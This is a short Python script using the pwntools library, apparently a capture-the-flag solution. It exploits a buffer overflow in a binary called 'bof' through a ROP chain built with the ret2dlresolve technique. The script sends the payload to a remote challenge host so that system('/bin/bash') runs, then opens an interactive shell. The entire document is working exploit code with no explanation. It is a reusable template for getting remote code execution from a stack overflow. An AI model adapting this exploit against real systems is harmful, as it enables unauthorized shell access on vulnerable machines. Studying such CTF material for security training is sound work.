from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.binary = "./bof"

e = ELF("./bof")
rop = ROP(e)

dlresolve = Ret2dlresolvePayload(e, symbol="system", args=["/bin/bash"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()
print(rop.dump())
payload = fit({0x80 + context.bytes : raw_rop, 0x150 : dlresolve.payload})

# p = gdb.debug("./bof")
# p = process("./bof")
p = remote("challenges.ctfd.io", 30096)

p.sendline(payload)

p.interactive()
